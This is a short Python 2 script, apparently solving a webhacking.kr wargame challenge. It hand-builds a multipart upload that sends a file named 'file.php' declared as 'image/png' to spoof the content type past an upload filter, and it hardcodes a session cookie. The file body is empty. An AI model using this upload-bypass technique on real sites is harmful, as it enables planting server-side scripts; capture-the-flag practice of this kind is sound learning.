import urllib
import httplib
import hashlib

file_name="file.php"

HTTP=httplib.HTTPConnection("webhacking.kr")
Param='------WebKitFormBoundarytkBj9DQQafJrSHIB\r\n'
Param+='Content-Disposition: form-data; name="file"; filename="'+file_name+'"\r\n'
Param+='Content-Type: image/png\r\n'
Param+='\r\n'
Param+='\r\n'
Param+='------WebKitFormBoundarytkBj9DQQafJrSHIB--'
Headers={"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundarytkBj9DQQafJrSHIB",
         "Cookie":"PHPSESSID=bc4730b877a0174a3eef0f693c329912;",
         "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"}
HTTP.request("POST","/challenge/web/web-21/index.php",Param,Headers)
Result=HTTP.getresponse().read()
print Result
